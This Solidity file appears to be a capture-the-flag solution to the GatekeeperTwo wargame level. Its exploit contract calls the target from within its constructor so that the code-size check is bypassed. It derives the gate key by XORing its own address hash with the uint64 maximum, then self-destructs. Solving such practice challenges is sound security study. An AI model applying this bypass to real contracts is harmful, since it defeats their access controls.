// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./GatekeeperTwo.sol";

function playerScript(address instanceAddress) {
    new GatekeeperTwoExploit(instanceAddress);
}

contract GatekeeperTwoExploit {
    constructor(address instanceAddress) {
        GatekeeperTwo instance = GatekeeperTwo(instanceAddress);
        uint64 gateKeyUint = (type(uint64).max) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        bytes8 gateKey = bytes8(gateKeyUint);
        instance.enter(gateKey);
        selfdestruct(payable(tx.origin));
    }
}
